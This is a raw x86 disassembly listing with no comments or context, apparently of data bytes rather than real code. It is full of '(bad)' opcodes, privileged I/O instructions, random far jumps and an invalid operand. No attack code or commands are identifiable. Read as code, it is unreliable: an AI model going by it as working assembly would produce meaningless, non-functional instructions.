  41e074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e075:	fisubr WORD PTR [edi]
  41e077:	push   0x3c
  41e079:	out    dx,al
  41e07a:	lods   eax,DWORD PTR ds:[esi]
  41e07b:	jp     0x41e0d2
  41e07d:	jne    0x41e09f
  41e07f:	push   ds
  41e080:	rol    BYTE PTR [ebp+0x47],cl
  41e083:	outs   dx,DWORD PTR ds:[esi]
  41e084:	xor    esi,edi
  41e086:	retf   0xea00
  41e089:	lock jnp 0x41e028
  41e08c:	or     esi,ebx
  41e08e:	test   DWORD PTR [esp+edi*4-0x2886d56f],0xed1e7260
  41e099:	mov    bh,0x3e
  41e09b:	xchg   esp,eax
  41e09c:	push   edx
  41e09d:	cwde   
  41e09e:	nop
  41e09f:	mov    edi,0x595b17c
  41e0a4:	add    DWORD PTR [ebx+0x43],0xffffffdd
  41e0a8:	sti    
  41e0a9:	pop    eax
  41e0aa:	hlt    
  41e0ab:	inc    edx
  41e0ac:	push   ebp
  41e0ad:	sbb    edi,DWORD PTR [ebp-0x71]
  41e0b0:	and    BYTE PTR [ebx-0x21],ch
  41e0b3:	retf   
  41e0b4:	into   
  41e0b5:	sbb    al,0x9a
  41e0b7:	imul   esp,DWORD PTR [ebx],0xffffff92
  41e0ba:	iret   
  41e0bb:	sbb    ecx,ebp
  41e0bd:	test   BYTE PTR [edx-0x19],bh
  41e0c0:	hlt    
  41e0c1:	jmp    0x41e0ea
  41e0c3:	sbb    bh,al
  41e0c5:	arpl   WORD PTR [eax+0x11],ax
  41e0c8:	lods   al,BYTE PTR ds:[esi]
  41e0c9:	std    
  41e0ca:	cld    
  41e0cb:	mov    eax,0x7ddd718e
  41e0d0:	xchg   esi,eax
  41e0d1:	and    DWORD PTR [ebp-0x1c91f550],eax
  41e0d7:	(bad)  
  41e0d8:	daa    
  41e0d9:	sbb    al,0xbd
  41e0db:	inc    esi
  41e0dc:	hlt    
  41e0dd:	stc    
  41e0de:	sar    DWORD PTR [si],cl
  41e0e1:	add    DWORD PTR ds:0x3bce31c4,ebx
  41e0e7:	sbb    DWORD PTR [ebp+0x26c36276],0xffffffdb
  41e0ee:	mov    dh,0x20
  41e0f0:	mov    eax,0x5984c95e
  41e0f5:	pop    ss
  41e0f6:	outs   dx,BYTE PTR ds:[esi]
  41e0f7:	push   ss
  41e0f8:	and    BYTE PTR [eax+0x4a],cl
  41e0fb:	add    ch,BYTE PTR [edi+0x5170a464]
  41e101:	sbb    BYTE PTR [ebp+0x6395b2b7],cl
  41e107:	mov    DWORD PTR fs:[ecx+eiz*1+0x571db27b],edi
  41e10f:	push   esp
  41e110:	jl     0x41e0a8
  41e112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e113:	aad    0x14
  41e115:	mov    ah,0xcc
  41e117:	je     0x41e140
  41e119:	xor    al,0x8c
  41e11b:	fsub   QWORD PTR [ecx-0x72cdb453]
  41e121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e122:	jle    0x41e11b
  41e124:	add    eax,0xfb6c2a51
  41e129:	pop    ss
  41e12a:	cmp    BYTE PTR [edx+0x47],bh
  41e12d:	aad    0xbe
  41e12f:	loopne 0x41e13c
  41e131:	adc    ebx,esp
  41e133:	cmp    dh,BYTE PTR [esi]
  41e135:	inc    eax
  41e136:	loop   0x41e135
  41e138:	out    0x96,eax
  41e13a:	and    al,ch
  41e13c:	mov    fs,WORD PTR [eax+0x47586e54]
  41e142:	xor    eax,0x6f8721b5
  41e147:	mov    DWORD PTR [esp+ecx*1],ecx
  41e14a:	bound  edx,QWORD PTR [ebp-0x35071a8b]
  41e150:	sti    
  41e151:	pop    edi
  41e152:	inc    edx
  41e153:	cmp    DWORD PTR [ebx-0x35],edi
  41e156:	js     0x41e0d8
  41e158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e159:	clc    
  41e15a:	data16 jb 0x41e152
  41e15d:	ins    DWORD PTR es:[edi],dx
  41e15e:	nop
  41e15f:	(bad)  
  41e160:	mov    edi,0x102a58c5
  41e165:	mov    dh,0x9
  41e167:	std    
  41e168:	and    cl,ah
  41e16a:	xchg   esi,eax
  41e16b:	enter  0x4afd,0xd8
  41e16f:	cdq    
  41e170:	lahf   
  41e171:	and    al,0x68
  41e173:	push   ss
  41e174:	test   al,0xb1
  41e176:	mov    ecx,DWORD PTR [edx+0x44cdc549]
  41e17c:	mov    ds:0x7ea90ca3,eax
  41e181:	fnstenv [eax]
  41e183:	or     ecx,DWORD PTR [esi+0x1fc2c942]
  41e189:	jmp    0x41e1a5
  41e18b:	test   al,0xa8
  41e18d:	xchg   ebx,eax
  41e18e:	or     cl,ah
  41e190:	jp     0x41e1f7
  41e192:	js     0x41e1bc
  41e194:	adc    al,bh
  41e196:	jns    0x41e1dd
  41e198:	(bad)  
  41e199:	les    esi,FWORD PTR [ebx-0x1d]
  41e19c:	gs int 0x9d
  41e19f:	repnz (bad) 
  41e1a2:	repz sbb al,0x82
  41e1a5:	or     DWORD PTR [edx-0x23fccae1],edx
  41e1ab:	pop    edx
  41e1ac:	dec    edx
  41e1ad:	push   cs
  41e1ae:	pop    esp
  41e1af:	xchg   esp,eax
  41e1b0:	mov    ebx,eax
  41e1b2:	cld    
  41e1b3:	push   0x225af9dd
  41e1b8:	icebp  
  41e1b9:	loopne 0x41e1ca
  41e1bb:	inc    ebx
  41e1bc:	test   al,0xad
  41e1be:	pushf  
  41e1bf:	and    cl,BYTE PTR [ecx+0x14af0886]
  41e1c5:	cmp    ch,dl
  41e1c7:	sub    DWORD PTR [ecx-0x4d],esp
  41e1ca:	mov    bh,0x61
  41e1cc:	jle    0x41e179
  41e1ce:	scas   eax,DWORD PTR es:[edi]
  41e1cf:	js     0x41e1d6
  41e1d1:	jmp    0x297450ba
  41e1d6:	hlt    
  41e1d7:	aas    
  41e1d8:	in     al,0x8d
  41e1da:	mov    ah,BYTE PTR [ecx]
  41e1dc:	ds cmp ch,al
  41e1df:	daa    
  41e1e0:	mul    BYTE PTR [edx]
  41e1e2:	pop    ebx
  41e1e3:	aaa    
  41e1e4:	mov    esp,0xbf8cd158
  41e1e9:	jmp    0xe837:0x75d7afa4
  41e1f0:	adc    BYTE PTR [eax-0x170332d6],bh
  41e1f6:	dec    ebp
  41e1f7:	das    
  41e1f8:	xchg   ebx,eax
  41e1f9:	xlat   BYTE PTR ds:[ebx]
  41e1fa:	repnz add al,0xbd
  41e1fd:	repnz dec edi
  41e1ff:	push   edi
  41e200:	xor    al,0x34
  41e202:	(bad)  
  41e203:	sub    DWORD PTR [ebp+0xad74edf],edx
  41e209:	add    eax,0x79f84187
  41e20e:	mov    ds:0xd836c2a1,al
  41e213:	and    ebx,DWORD PTR [eax+ebp*2]
  41e216:	and    esi,DWORD PTR [esi+edx*2]
  41e219:	xchg   ecx,eax
  41e21a:	sub    al,BYTE PTR [ebx+0x7cb43988]
  41e220:	lds    edi,FWORD PTR [edx]
  41e222:	test   bh,0x97
  41e225:	fisttp WORD PTR [edx+0x5b]
  41e228:	enter  0xecdd,0x7d
  41e22c:	dec    ecx
  41e22d:	jg     0x41e1fb
  41e22f:	mov    ah,0xa4
  41e231:	and    eax,0xbf65521
  41e236:	jge    0x41e1cf
  41e238:	shl    DWORD PTR [ecx+edx*4-0x5c892211],0x1a
  41e240:	aad    0xa6
  41e242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e243:	call   DWORD PTR ds:0x29d16a58
  41e249:	jne    0x41e23b
  41e24b:	das    
  41e24c:	les    ebp,FWORD PTR [eax]
  41e24e:	into   
  41e24f:	(bad)  
  41e250:	and    al,0x1b
  41e252:	or     al,0x2d
  41e254:	daa    
  41e255:	sub    al,0x41
  41e257:	xchg   esp,eax
  41e258:	ret    0xb2f6
  41e25b:	hlt    
  41e25c:	test   DWORD PTR [esi-0x68],esp
  41e25f:	jecxz  0x41e1e2
  41e261:	adc    eax,esi
  41e263:	stc    
  41e264:	push   cs
  41e265:	cmc    
  41e266:	lock and esi,DWORD PTR [ebx]
  41e269:	pop    es
  41e26a:	xchg   dl,cl
  41e26c:	int3   
  41e26d:	lds    ecx,FWORD PTR [ebx+0x3e18b0eb]
  41e273:	scas   eax,DWORD PTR es:[edi]
  41e274:	mov    ebx,0xccfa56c8
  41e279:	jbe    0x41e215
  41e27b:	dec    esp
  41e27c:	sbb    BYTE PTR [eax+ebp*4+0x65],ah
  41e280:	jmp    0xf831:0x7cfc3ee8
  41e287:	rcl    BYTE PTR [edx+0x68],0xdd
  41e28b:	add    eax,0xfa4df1fd
  41e290:	xchg   esi,eax
  41e291:	jg     0x41e2ed
  41e293:	addr16 mov eax,ds:0x8f1e
  41e297:	jns    0x41e225
  41e299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e29a:	inc    edx
  41e29b:	ss ret 
  41e29d:	loope  0x41e257
  41e29f:	jp     0x41e2fd
  41e2a1:	pop    esp
  41e2a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2a3:	rcr    eax,1
  41e2a5:	neg    DWORD PTR [eax+ebp*1-0xb9de500]
  41e2ac:	rcl    DWORD PTR [ebx+ebp*2-0xf],cl
  41e2b0:	or     ch,al
  41e2b2:	sbb    ebp,DWORD PTR ds:0x5f5fd395
  41e2b8:	pop    ebp
  41e2b9:	pop    edi
  41e2ba:	pop    es
  41e2bb:	add    eax,0x564976e4
  41e2c0:	fmul   st,st(4)
  41e2c2:	lahf   
  41e2c3:	ret    0x62e2
  41e2c6:	push   ebp
  41e2c7:	xchg   DWORD PTR [ebx-0x3e6827a8],ebx
  41e2cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2ce:	jae    0x41e349
  41e2d0:	icebp  
  41e2d1:	out    dx,al
  41e2d2:	sahf   
  41e2d3:	pop    ecx
  41e2d4:	dec    edx
  41e2d5:	fbld   TBYTE PTR [edx-0x32498a33]
  41e2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2dc:	jns    0x41e2e5
  41e2de:	stc    
  41e2df:	call   0x5882:0x9e55e759
  41e2e6:	ins    DWORD PTR es:[edi],dx
  41e2e7:	jb     0x41e287
  41e2e9:	push   edx
  41e2eb:	add    eax,0xb78c07e3
  41e2f0:	cs dec esi
  41e2f2:	dec    BYTE PTR [edx]
  41e2f4:	or     BYTE PTR [esi+0x34bdb8ba],0x12
  41e2fb:	push   eax
  41e2fc:	aad    0x38
  41e2fe:	imul   edi,DWORD PTR [edx],0x2bf7062f
  41e304:	pop    ecx
  41e305:	push   es
  41e306:	enter  0x76dc,0x96
  41e30a:	push   ecx
  41e30b:	mov    ebx,0x61fd2c75
  41e310:	in     eax,0x87
  41e312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e313:	dec    ebx
  41e314:	lods   eax,DWORD PTR ds:[esi]
  41e315:	int    0x1f
  41e317:	stos   DWORD PTR es:[edi],eax
  41e318:	cmp    dh,BYTE PTR [ecx]
  41e31a:	xchg   DWORD PTR [esi+0x40],eax
  41e31d:	iret   
  41e31e:	adc    eax,0xd24d0952
  41e323:	sbb    edx,DWORD PTR [ebx]
  41e325:	lds    ebx,FWORD PTR [ecx-0x61a2fce]
  41e32b:	arpl   WORD PTR [ebx+0x1b],cx
  41e32e:	hlt    
  41e32f:	and    eax,0xe19ba194
  41e334:	and    ebp,edx
  41e336:	or     dh,BYTE PTR [edi-0x154b97bc]
  41e33c:	pop    edi
  41e33d:	arpl   WORD PTR [ebx+0x72],ax
  41e340:	mov    esi,0x4c34ef19
  41e345:	jmp    0x41e300
  41e347:	jo     0x41e370
  41e349:	retf   0x93fe
  41e34c:	test   eax,0x53c9b535
  41e351:	into   
  41e352:	out    dx,eax
  41e353:	div    bl
  41e355:	pop    esi
  41e357:	fcom   DWORD PTR [edx-0x20f7a033]
  41e35d:	gs xchg edx,eax
  41e35f:	adc    eax,0xc6ac53c2
  41e364:	xor    DWORD PTR [ebp-0x6f5b04b8],esi
  41e36a:	or     esi,DWORD PTR [edx+0x65]
  41e36d:	leave  
  41e36e:	add    ch,BYTE PTR [ebp-0x62]
  41e371:	stos   DWORD PTR es:[edi],eax
  41e372:	lock xor dl,BYTE PTR [edi]
  41e375:	jp     0x41e3a7
  41e377:	fdivr  DWORD PTR [edi+eax*4+0xc]
  41e37b:	jmp    DWORD PTR [esi+0x7d6649c9]
  41e381:	inc    eax
  41e382:	aad    0x17
  41e384:	ror    esi,cl
  41e386:	cmp    eax,0x48e84425
  41e38b:	cli    
  41e38c:	jno    0x41e3ba
  41e38e:	xor    ebp,DWORD PTR [ecx+0x48]
  41e391:	loop   0x41e40c
  41e393:	and    eax,0x4c2851b6
  41e398:	mov    esp,0x923a57e7
  41e39d:	xor    ecx,DWORD PTR [edx+0x54]
  41e3a0:	xor    al,0x39
  41e3a2:	es xor al,0xac
  41e3a5:	(bad)  
  41e3a6:	push   0x9d4f704f
  41e3ab:	fdivr  st,st(0)
  41e3ad:	jb     0x41e415
  41e3af:	repnz cmp ebp,ecx
  41e3b2:	bound  eax,QWORD PTR [ebx+0x61]
  41e3b5:	mov    al,ds:0x26b2ba8c
  41e3ba:	stc    
  41e3bb:	add    al,0xce
  41e3bd:	arpl   sp,bp
  41e3bf:	cli    
  41e3c0:	fidiv  WORD PTR [ecx]
  41e3c2:	inc    ecx
  41e3c3:	cmc    
  41e3c4:	push   esi
  41e3c5:	ss fwait
  41e3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3c8:	sbb    eax,DWORD PTR ds:0x7e503b76
  41e3ce:	dec    ebp
  41e3cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3d0:	jmp    0xc41a7c42
  41e3d5:	in     eax,0xa0
  41e3d7:	xchg   DWORD PTR [ebp+0x33],ebp
  41e3da:	cld    
  41e3db:	xlat   BYTE PTR ds:[ebx]
  41e3dc:	cdq    
  41e3dd:	stos   DWORD PTR es:[edi],eax
  41e3de:	dec    edi
  41e3df:	stos   DWORD PTR es:[edi],eax
  41e3e0:	lock pusha 
  41e3e2:	adc    BYTE PTR [ecx-0x6b],al
  41e3e5:	test   esp,ebx
  41e3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3e8:	push   edx
  41e3e9:	push   ebx
  41e3ea:	ins    BYTE PTR es:[edi],dx
  41e3eb:	je     0x41e460
  41e3ed:	arpl   di,di
  41e3ef:	repz int 0x39
  41e3f2:	or     eax,0x78e530dd
  41e3f7:	mov    ebx,0xf83a877d
  41e3fc:	mov    ah,0x65
  41e3fe:	push   0x40ee3858
  41e403:	(bad)  
  41e404:	(bad)  
  41e406:	push   cs
  41e407:	dec    esp
  41e408:	push   ecx
  41e409:	jo     0x41e3c1
  41e40b:	jp     0x41e3b6
  41e40d:	xor    eax,0xc97752b3
  41e412:	js     0x41e483
  41e414:	mov    ds,WORD PTR [eax+eax*1]
  41e417:	inc    esi
  41e418:	mul    DWORD PTR [ebp-0x5862c430]
  41e41e:	mov    ebx,0x737ff33c
  41e423:	dec    eax
  41e424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e425:	aam    0xa2
  41e427:	or     bl,ch
  41e429:	mov    edi,DWORD PTR [ecx+0x3eb7de48]
  41e42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e430:	ja     0x41e3fe
  41e432:	pop    ss
  41e433:	jl     0x41e414
  41e435:	mov    al,ds:0xcd283672
  41e43a:	push   cs
  41e43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e43c:	int    0x4c
  41e43e:	inc    ebp
  41e43f:	dec    esi
  41e440:	pop    edx
  41e441:	add    ebx,ecx
  41e443:	sub    ebp,0xffffff81
  41e446:	adc    ch,al
  41e448:	daa    
  41e449:	cli    
  41e44a:	pop    ecx
  41e44b:	ins    BYTE PTR es:[edi],dx
  41e44c:	ss dec eax
  41e44e:	inc    edi
  41e44f:	add    DWORD PTR [edi-0x24a3e64a],0xa9f485b0
  41e459:	sub    DWORD PTR [eax+ebp*4-0x19931653],eax
  41e460:	aam    0x9e
  41e462:	ror    eax,0x33
  41e465:	test   BYTE PTR [ebx+eiz*1-0xa943065],dh
  41e46c:	js     0x41e426
  41e46e:	sahf   
  41e46f:	cmp    edx,DWORD PTR [esi-0x7c]
  41e472:	mov    ebx,0x835510d8
  41e477:	xor    cl,BYTE PTR [ebp-0xe]
  41e47a:	ror    DWORD PTR ds:0xe21d8bda,cl
  41e480:	bound  ebp,QWORD PTR [ebx-0x28a4e296]
  41e486:	popf   
  41e487:	sbb    eax,ecx
  41e489:	sub    BYTE PTR [edx+esi*2-0x1d],dl
  41e48d:	push   esi
  41e48e:	(bad)  
  41e48f:	aad    0x4b
  41e491:	mov    WORD PTR [eax-0x6a],gs
  41e494:	fs ins BYTE PTR es:[edi],dx
  41e496:	xor    eax,ebx
  41e498:	inc    esp
  41e499:	in     eax,0xc8
  41e49b:	mov    esi,0x7aa82540
  41e4a0:	xor    DWORD PTR [ebx],ebp
  41e4a2:	cmp    DWORD PTR [eax+0x1f79f2b],eax
  41e4a8:	adc    dh,BYTE PTR [edx+0x6d]
  41e4ab:	out    dx,al
  41e4ac:	bound  ebp,QWORD PTR [ecx-0x6a]
  41e4af:	lock cs out 0x11,eax
  41e4b3:	mov    ebx,0x9ad2f472
  41e4b8:	xor    bh,bl
  41e4ba:	in     al,0x38
  41e4bc:	aam    0x90
  41e4be:	and    eax,0x239939a8
  41e4c3:	sub    cl,dh
  41e4c5:	pop    ebx
  41e4c6:	jbe    0x41e4fd
  41e4c8:	xor    BYTE PTR [ebp-0x7],dl
  41e4cb:	fisubr DWORD PTR [esi+0x20]
  41e4ce:	imul   ebx,ecx,0xe7cac1b5
  41e4d4:	scas   al,BYTE PTR es:[edi]
  41e4d5:	xchg   esp,eax
  41e4d6:	shl    DWORD PTR [edi-0x2f0b1f58],1
  41e4dc:	shl    BYTE PTR [edi+0x3ea87873],cl
  41e4e2:	sbb    BYTE PTR [esi],dl
  41e4e4:	into   
  41e4e5:	xchg   edi,eax
  41e4e6:	iret   
  41e4e7:	adc    eax,0x5c820b2b
  41e4ec:	mov    fs,WORD PTR [ecx-0x5c6ec714]
  41e4f2:	cmp    ebx,DWORD PTR [edx-0x7a9a7cbe]
  41e4f8:	add    BYTE PTR [ecx-0x31],al
  41e4fb:	cmp    DWORD PTR [eax],0x71
  41e4fe:	nop
  41e4ff:	fwait
  41e500:	shr    BYTE PTR [ebx-0x7c],1
  41e503:	mov    esi,0x4d90927c
  41e508:	sub    dl,al
  41e50a:	add    ch,bh
  41e50c:	xor    cl,BYTE PTR [ebp-0x5f]
  41e50f:	mov    WORD PTR ds:0xf36b8013,es
  41e515:	pop    ebx
  41e516:	mov    dl,0x96
  41e518:	imul   eax,DWORD PTR [esi+0x468ad060],0x1f
  41e51f:	sub    ah,bh
  41e521:	popf   
  41e522:	ret    
  41e523:	cmp    eax,eax
  41e525:	pop    es
  41e526:	push   ebp
  41e527:	xchg   edi,eax
  41e528:	inc    ebx
  41e529:	or     ah,ch
  41e52b:	sbb    BYTE PTR [ebx+0x781b2c8c],0xc0
  41e532:	mov    ch,0x9e
  41e534:	aam    0x53
  41e536:	push   cs
  41e537:	dec    ecx
  41e538:	into   
  41e539:	shl    DWORD PTR [ebx+0x67e3aaf4],cl
  41e53f:	mov    dl,0x57
  41e541:	sub    al,0x3a
  41e543:	or     ebp,0x460c199d
  41e549:	js     0x41e52d
  41e54b:	es push edi
  41e54d:	push   0xd7d9ebac
  41e552:	xchg   esi,eax
  41e553:	js     0x41e4e1
  41e555:	psrld  mm0,mm6
  41e558:	xchg   BYTE PTR [ebp+0x75],bh
  41e55b:	jle    0x41e5ce
  41e55d:	rcr    BYTE PTR [ebx],0xd0
  41e560:	pop    esp
  41e561:	into   
  41e562:	pop    edx
  41e563:	(bad)  
  41e564:	mov    dl,0xfb
  41e566:	or     al,dh
  41e568:	mov    al,al
  41e56a:	sub    ah,0x42
  41e56d:	mov    ch,0xbb
  41e56f:	bound  ebp,QWORD PTR [eax-0x5c]
  41e572:	dec    ecx
  41e573:	ds jecxz 0x41e56a
  41e576:	pop    esi
  41e577:	sbb    eax,0x1cdcf368
  41e57c:	sbb    dl,al
  41e57e:	and    eax,DWORD PTR [ebx+0x44a857d7]
  41e584:	and    al,0x83
  41e586:	push   esp
  41e587:	jns    0x41e529
  41e589:	out    dx,al
  41e58a:	dec    edi
  41e58b:	dec    ebp
  41e58c:	push   0x2
  41e58e:	in     al,dx
  41e58f:	or     DWORD PTR [ecx-0x3815adcc],ecx
  41e595:	hlt    
  41e596:	mov    ah,0x3
  41e598:	push   ebp
  41e599:	aam    0xc8
  41e59b:	(bad)  
  41e59c:	aad    0x37
  41e59e:	ins    DWORD PTR es:[edi],dx
  41e59f:	mov    ebx,0x99b67347
  41e5a4:	fmul   QWORD PTR [esi+0x4f]
  41e5a7:	ins    BYTE PTR es:[edi],dx
  41e5a8:	stos   DWORD PTR es:[edi],eax
  41e5a9:	pop    ecx
  41e5aa:	sbb    eax,0x293df898
  41e5af:	cs sti 
  41e5b1:	aad    0x84
  41e5b3:	pop    edx
  41e5b4:	(bad)  
  41e5b5:	jmp    0x41e5eb
  41e5b7:	jb     0x41e53a
  41e5b9:	fsubr  DWORD PTR [edx+0x1f2d2872]
  41e5bf:	test   al,0xd9
  41e5c1:	xor    BYTE PTR [edx],bh
  41e5c3:	jno    0x41e628
  41e5c5:	mov    ?,esp
  41e5c7:	inc    esp
  41e5c8:	or     BYTE PTR [esi+0x3df84bcb],0x42
  41e5cf:	jle    0x41e62d
  41e5d1:	inc    ebx
  41e5d2:	push   es
  41e5d3:	and    ebp,DWORD PTR [eax+0x6f]
  41e5d6:	(bad)  
  41e5d7:	push   ebx
  41e5d8:	retf   0x3f4e
  41e5db:	adc    eax,0x11f4554c
  41e5e0:	cmc    
  41e5e1:	jo     0x41e5f8
  41e5e3:	fmul   QWORD PTR [esi+0x29]
  41e5e6:	scas   al,BYTE PTR es:[edi]
  41e5e7:	test   al,0x15
  41e5e9:	sbb    BYTE PTR [edx-0x33a2c78d],dl
  41e5ef:	mov    cl,0xf4
  41e5f1:	clc    
  41e5f2:	dec    edx
  41e5f3:	xor    al,0x67
  41e5f5:	and    DWORD PTR [edx-0x61a7a14a],edi
  41e5fb:	inc    edi
  41e5fc:	data16 sar BYTE PTR [ebp+0x16],1
  41e600:	data16 and BYTE PTR [eax+0x47],dl
  41e604:	mov    gs,ebx
  41e606:	pop    eax
  41e607:	retf   
  41e608:	and    BYTE PTR [eax-0x2],ch
  41e60b:	adc    ch,BYTE PTR [eax+0x58]
  41e60e:	inc    ecx
  41e60f:	cmp    DWORD PTR [edx+0x102108a4],edi
  41e615:	mov    esp,0x245187ae
  41e61a:	cmp    eax,0xebd593fc
  41e61f:	outs   dx,DWORD PTR ds:[esi]
  41e620:	or     ch,BYTE PTR [esi+0x6c6ad413]
  41e626:	inc    ebp
  41e627:	mov    ebx,0x36fdfa29
  41e62c:	pop    esi
  41e62d:	call   0x1354:0xdb5e4f8a
  41e634:	test   eax,0xa830e0b9
  41e639:	mov    bl,dl
  41e63b:	add    al,0xb9
  41e63d:	(bad)  
  41e63f:	sub    eax,0x121d8ce3
  41e644:	dec    edx
  41e645:	(bad)  
  41e646:	outs   dx,DWORD PTR ds:[esi]
  41e647:	lahf   
  41e648:	mov    al,ds:0xaf38fa06
  41e64d:	add    BYTE PTR [edx+0x59],al
  41e650:	rol    ah,cl
  41e652:	ror    edx,1
  41e654:	lods   eax,DWORD PTR ds:[esi]
  41e655:	outs   dx,BYTE PTR ds:[esi]
  41e656:	push   ebp
  41e657:	mov    eax,0x73ed7291
  41e65c:	push   edi
  41e65d:	loope  0x41e61d
  41e65f:	lahf   
  41e660:	inc    ebp
  41e661:	ss inc edx
  41e663:	pop    bx
  41e665:	ret    0x56fc
  41e668:	in     al,0xc3
  41e66a:	fmul   st,st(0)
  41e66c:	jge    0x41e67d
  41e66e:	push   eax
  41e66f:	xchg   ah,bl
  41e671:	cmp    ebp,DWORD PTR [ecx-0x4816acfb]
  41e677:	dec    esp
  41e678:	int    0xc8
  41e67a:	cwde   
  41e67b:	push   ds
  41e67c:	xchg   esp,eax
  41e67d:	fisttp QWORD PTR [ebp-0x76]
  41e680:	jge    0x41e68b
  41e682:	dec    edi
  41e683:	inc    ebp
  41e684:	in     eax,dx
  41e685:	(bad)  
  41e686:	into   
  41e687:	nop
  41e688:	dec    esi
  41e689:	imul   esp,DWORD PTR [ebx-0x47],0x8
  41e68d:	popf   
  41e68e:	inc    eax
  41e68f:	sub    al,0x5
  41e691:	pop    edx
  41e692:	les    eax,FWORD PTR [esi-0x271c8634]
  41e698:	xor    DWORD PTR [esi+eiz*2+0x74],edi
  41e69c:	lock jne 0x41e6e7
  41e69f:	hlt    
  41e6a0:	cld    
  41e6a1:	ss dec edi
  41e6a3:	sbb    edx,DWORD PTR [edi]
  41e6a5:	add    al,0xbc
  41e6a7:	cmp    al,0x17
  41e6a9:	js     0x41e676
  41e6ab:	stc    
  41e6ac:	aad    0xbf
  41e6ae:	pop    DWORD PTR [edx+eax*4-0x2]
  41e6b2:	bound  ecx,QWORD PTR [esi+0x7]
  41e6b5:	cmp    BYTE PTR [ebp+0x51],0x5d
  41e6b9:	inc    eax
  41e6ba:	and    al,0xd
  41e6bc:	sub    ecx,ebp
  41e6be:	inc    edi
  41e6bf:	pop    edx
  41e6c0:	std    
  41e6c1:	mov    esi,0x2318ee4a
  41e6c6:	push   esp
  41e6c7:	neg    DWORD PTR [esi-0x3f]
  41e6ca:	pop    edx
  41e6cb:	repz cwde 
  41e6cd:	bound  esp,QWORD PTR [edx+ecx*1+0x41]
  41e6d1:	cdq    
  41e6d2:	and    edx,ebp
  41e6d4:	stc    
  41e6d5:	test   BYTE PTR [ebx],bh
  41e6d7:	popf   
  41e6d8:	test   eax,0x5d99a394
  41e6dd:	jmp    0x41e698
  41e6df:	xor    dl,BYTE PTR [eax]
  41e6e1:	mov    cl,0xc5
  41e6e3:	hlt    
  41e6e4:	jmp    0x41e718
  41e6e6:	js     0x41e729
  41e6e8:	mov    esi,0x4f913759
  41e6ed:	cld    
  41e6ee:	popa   
  41e6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f0:	fstp   TBYTE PTR [edx]
  41e6f2:	sub    al,0x40
  41e6f4:	fmul   QWORD PTR [eax-0xe925aa9]
  41e6fa:	fistp  DWORD PTR [ebp-0x7d3ce4bd]
  41e700:	int    0x3b
  41e702:	adc    DWORD PTR [ecx+0x5a],0x70554d66
  41e709:	into   
  41e70a:	pop    edi
  41e70b:	xor    cl,BYTE PTR [ebx-0x78]
  41e70e:	pushf  
  41e70f:	out    dx,eax
  41e710:	ret    
  41e711:	pop    ebx
  41e712:	add    eax,ecx
  41e714:	push   esi
  41e715:	jae    0x41e6d8
  41e717:	loop   0x41e75b
  41e719:	into   
  41e71a:	daa    
  41e71b:	les    ebx,FWORD PTR [ecx]
  41e71d:	sbb    eax,0xb44b4015
  41e722:	xor    al,0xc9
  41e724:	in     eax,0x1c
  41e726:	sub    dh,BYTE PTR [esi-0x757e2e0f]
  41e72c:	fist   WORD PTR [eax-0x75]
  41e72f:	pop    ecx
  41e730:	cli    
  41e731:	out    0x4f,al
  41e733:	push   DWORD PTR [esi+0x45]
  41e736:	or     BYTE PTR [edx],al
  41e738:	mov    bh,0x5a
  41e73a:	pop    eax
  41e73b:	loopne 0x41e77d
  41e73d:	and    DWORD PTR [ecx-0x977c5a4],eax
  41e743:	fnstsw WORD PTR [ecx+ecx*8]
  41e746:	sub    al,0xd
  41e748:	pop    edx
  41e749:	xchg   edx,eax
  41e74a:	ds cmp eax,0x1bf85b9d
  41e750:	(bad)  
  41e751:	adc    eax,0x9aef6b0
  41e756:	in     eax,dx
  41e757:	adc    DWORD PTR [edx-0x2f],ebp
  41e75a:	add    eax,edx
  41e75c:	jmp    0x41e6fe
  41e75e:	ror    DWORD PTR [edi+0x49],1
  41e761:	(bad)  
  41e762:	(bad)  
  41e763:	mov    bh,0x6b
  41e765:	int3   
  41e766:	or     ecx,eax
  41e768:	xor    dh,dl
  41e76a:	div    BYTE PTR cs:[esi]
  41e76d:	pop    ds
  41e76e:	pusha  
  41e76f:	std    
  41e770:	sub    bh,bl
  41e772:	fsub   DWORD PTR [ebx]
  41e774:	retf   0x45b
  41e777:	xor    esi,DWORD PTR [eax]
  41e779:	fcom   DWORD PTR [esi-0x6451d1ef]
  41e77f:	and    dl,ch
  41e781:	jecxz  0x41e758
  41e783:	and    eax,0xaf6bd1c4
  41e788:	repnz pop ecx
  41e78a:	push   0x15da2cfb
  41e78f:	sub    al,0x22
  41e791:	inc    esi
  41e792:	jbe    0x41e7b2
  41e794:	pop    es
  41e795:	cmp    eax,0xb8789452
  41e79a:	sub    dl,ch
  41e79c:	imul   ch
  41e79e:	dec    eax
  41e79f:	jmp    DWORD PTR [ebp-0x4f9f30db]
  41e7a5:	js     0x41e809
  41e7a7:	in     al,dx
  41e7a8:	add    esi,DWORD PTR ds:0xb9546d79
  41e7ae:	scas   eax,DWORD PTR es:[edi]
  41e7af:	add    al,0x8
  41e7b1:	fldenv es:[ebp+0x1c]
  41e7b5:	mov    esp,0xd4e3f798
  41e7ba:	fs mov esp,0xffc6d12d
  41e7c0:	(bad)
  41e7c3:	scas   eax,DWORD PTR es:[edi]
  41e7c4:	lahf   
  41e7c5:	and    ecx,DWORD PTR [edi]
  41e7c7:	and    eax,0x6a2a1643
  41e7cc:	into   
